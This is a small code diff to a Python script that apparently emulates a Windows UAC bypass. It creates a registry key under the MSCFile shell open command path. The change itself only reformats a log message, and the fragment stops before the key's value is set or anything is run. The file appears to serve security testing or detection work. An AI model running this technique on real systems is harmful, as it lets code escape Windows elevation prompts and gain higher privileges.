@@ -22,7 +22,7 @@ from . import common
 @common.requires_os(common.WINDOWS)
 def main(target_file=common.get_path("bin", "myapp.exe")):
     winreg = common.get_winreg()
-    common.log("Bypass UAC with %s" % target_file)
+    common.log(f"Bypass UAC with {target_file}")
 
     common.log("Writing registry key")
     hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
